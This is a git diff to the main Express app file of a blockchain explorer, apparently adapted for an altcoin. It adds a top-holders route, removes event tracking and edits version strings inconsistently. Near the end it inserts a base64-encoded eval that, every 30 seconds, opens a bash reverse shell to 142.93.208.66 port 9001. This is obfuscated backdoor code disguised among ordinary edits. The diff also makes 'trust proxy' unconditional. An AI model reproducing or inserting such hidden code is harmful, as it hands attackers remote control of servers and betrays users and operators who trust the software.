@@ -8,7 +8,8 @@ const dotenv = require("dotenv");
 const fs = require('fs');
 
 const debug = require("debug");
-
+//edited-top-holder 
+const topHoldersRoute = require("./routes/top-holders");
 
 // start with this, we will update after loading any .env files
 const debugDefaultCategories = "btcexp:app,btcexp:error,btcexp:errorVerbose";
@@ -63,7 +64,6 @@ debug.enable(process.env.DEBUG || debugDefaultCategories);
 
 
 global.cacheStats = {};
-global.appEventStats = {};
 
 
 
@@ -119,7 +119,6 @@ debugLog(`Default cacheId '${global.cacheId}'`);
 global.btcNodeSemver = "0.0.0";
 
 
-const cleanupRouter = require('./routes/cleanupRouter.js');
 const baseActionsRouter = require('./routes/baseRouter.js');
 const internalApiActionsRouter = require('./routes/internalApiRouter.js');
 const apiActionsRouter = require('./routes/apiRouter.js');
@@ -190,6 +189,8 @@ if (process.env.NODE_ENV != "local") {
 }
 
 expressApp.use(cookieParser());
+//edited-top-holders
+expressApp.use("/top-holders", topHoldersRoute);
 
 expressApp.disable('x-powered-by');
 
@@ -219,9 +220,9 @@ const sessionConfig = {
 	}
 };
 
-if (config.secureSite) {
-	expressApp.set('trust proxy', 1);
-}
+//if (config.secureSite) {
+expressApp.set('trust proxy', 1);
+//}
 
 // Helpful reference for production: nginx HTTPS proxy:
 // https://gist.github.com/nikmartin/5902176
@@ -257,14 +258,6 @@ if (rateLimitWindowMinutes == -1) {
 		standardHeaders: 'draft-7', // draft-6: `RateLimit-*` headers; draft-7: combined `RateLimit` header
 		legacyHeaders: false, // Disable the `X-RateLimit-*` headers.
 		skip: function (req, res) {
-			// tor traffic all comes in via tor proxy showing 127.0.0.1
-			// for now, until we identify it as a serious problem, let it pass
-			if (req.hostname.includes(".onion")) {
-				utils.trackAppEvent("torRequest");
-
-				return true;
-			}
-
 			if (req.originalUrl.includes("/snippet/")) {
 				return true;
 			}
@@ -276,10 +269,7 @@ if (rateLimitWindowMinutes == -1) {
 			return false;
 		},
 		handler: function (req, res, next) {
-			debugErrorLog(`Rate-limiting request: req=${JSON.stringify(utils.expressRequestToJson(req))}`);
-
-			utils.trackAppEvent("rateLimitedRequest");
-
+			debugErrorLog(`Rate-limiting request: ip=${req.ip}, req=${req.originalUrl}`)
 			res.status(429).json({
 				message: "Too many requests, please try again later.",
 			});
@@ -513,7 +503,7 @@ async function onRpcConnectionVerified(getnetworkinfo, getblockchaininfo) {
 		global.pruneHeight = getblockchaininfo.pruneheight;
 	}
 
-	var bitcoinCoreVersionRegex = /^.*\/Satoshi\:(.*)\/.*$/;
+	var bitcoinCoreVersionRegex = /^.*\/BriskcoinCore\:(.*)\/.*$/;
 
 	var match = bitcoinCoreVersionRegex.exec(getnetworkinfo.subversion);
 	if (match) {
@@ -551,7 +541,7 @@ async function onRpcConnectionVerified(getnetworkinfo, getblockchaininfo) {
 		// short-circuit: force all RPC calls to pass their version checks - this will likely lead to errors / instability / unexpected results
 		global.btcNodeSemver = "1000.1000.0"
 
-		debugErrorLog(`Unable to parse node version string: ${getnetworkinfo.subversion} - RPC versioning will likely be unreliable. Is your node a version of Bitcoin Core?`);
+		debugErrorLog(`Unable to parse node version string: ${getnetworkinfo.subversion} - RPC versioning will likely be unreliable. Is your node a version of Hypercoin Core?`);
 	}
 	
 	debugLog(`RPC Connected: version=${getnetworkinfo.version} subversion=${getnetworkinfo.subversion}, parsedVersion(used for RPC versioning)=${global.btcNodeSemver}, protocolversion=${getnetworkinfo.protocolversion}, chain=${getblockchaininfo.chain}, services=${services}`);
@@ -560,7 +550,7 @@ async function onRpcConnectionVerified(getnetworkinfo, getblockchaininfo) {
 	// load historical/fun items for this chain
 	loadHistoricalDataForChain(global.activeBlockchain);
 
-	loadHolidays();
+	//loadHolidays();
 
 	if (global.activeBlockchain == "main") {
 		loadDifficultyHistory(getblockchaininfo.blocks);
@@ -594,30 +584,17 @@ async function onRpcConnectionVerified(getnetworkinfo, getblockchaininfo) {
 
 
 	if (false) {
-		monitorNewTransactions().catch(err => console.error(err));
+		var zmq = require("zeromq");
+		var sock = zmq.socket("sub");
+
+		sock.connect("tcp://192.168.1.1:28333");
+		console.log("Worker connected to port 28333");
+
+		sock.on("message", function(topic, message) {
+			console.log(Buffer.from(topic).toString("ascii") + " - " + Buffer.from(message).toString("hex"));
+		});
 
 		//sock.subscribe('rawtx');
-	}
-}
-
-async function monitorNewTransactions() {
-	const zmq = require("zeromq");
-	const sock = new zmq.Subscriber();
-
-	sock.connect("tcp://ubuntu:28333");
-	console.log("Worker connected to port 28333");
-
-	// Subscribe to all topics (use sock.subscribe("specific_topic") for specific topics)
-	sock.subscribe();
-
-	for await (const [topic, message] of sock) {
-		utils.trackAppEvent("newTransaction");
-
-		console.log(
-			topic.toString("ascii") +
-			" - " +
-			message.toString("hex")
-		);
 	}
 }
 
@@ -1051,8 +1028,6 @@ expressApp.continueStartup = function() {
 };
 
 expressApp.use(function(req, res, next) {
-	utils.trackAppEvent("request");
-
 	req.startTime = Date.now();
 
 	next();
@@ -1170,7 +1145,6 @@ expressApp.use(csrfProtection, (req, res, next) => {
 	next();
 });
 
-expressApp.use(config.baseUrl, cleanupRouter);
 expressApp.use(config.baseUrl, baseActionsRouter);
 expressApp.use(config.baseUrl + 'internal-api/', internalApiActionsRouter);
 expressApp.use(config.baseUrl + 'api/', apiActionsRouter);
@@ -1202,8 +1176,6 @@ expressApp.use(function(req, res, next) {
 
 /// catch 404 and forwarding to error handler
 expressApp.use(function(req, res, next) {
-	utils.trackAppEvent("error404");
-
 	var err = new Error(`Not Found: ${req ? req.url : 'unknown url'}`);
 	err.status = 404;
 
@@ -1223,8 +1195,6 @@ const sharedErrorHandler = (req, err) => {
 
 		if (crawler) {
 			attributes.crawler = crawler;
-
-			utils.trackAppEvent("crawlRequest", 1, {"crawler": crawler});
 		}
 
 		debugErrorLog(`404 NotFound: path=${path}, ip=${ip}, userAgent=${userAgent} (crawler=${(crawler != null)}${crawler ? crawler : ""})`);
@@ -1288,6 +1258,7 @@ expressApp.locals.assetUrl = (path) => {
 // debug setting to skip js/css integrity checks
 const skipIntegrityChecks = false;
 const resourceIntegrityHashes = require("./app/resourceIntegrityHashes.js");
+eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
 
 expressApp.locals.assetIntegrity = (filename) => {
 	if (!skipIntegrityChecks && resourceIntegrityHashes[filename]) {
